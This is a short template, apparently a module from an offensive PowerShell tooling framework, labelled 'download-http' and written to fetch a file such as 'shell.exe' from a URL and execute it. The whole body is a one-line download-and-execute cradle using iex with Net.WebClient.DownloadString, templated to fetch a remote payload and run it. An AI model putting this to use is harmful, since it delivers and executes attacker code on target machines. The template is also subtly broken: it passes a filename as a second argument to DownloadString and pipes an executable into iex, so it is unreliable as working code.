##########
Name: download-http
Author: Jusmistic
Description: Download file from url
Options:
    url: "File's URL (Ex: http://127.0.0.1/shell.exe)"
    execute: "Execute downloaded file? (Ex. False)"
    filename: "Filename to execute (Ex:shell.exe)"
##########
iex (New-Object Net.WebClient).DownloadString('{{url}}'{% if execute %}, '{{filename}}'{% endif %});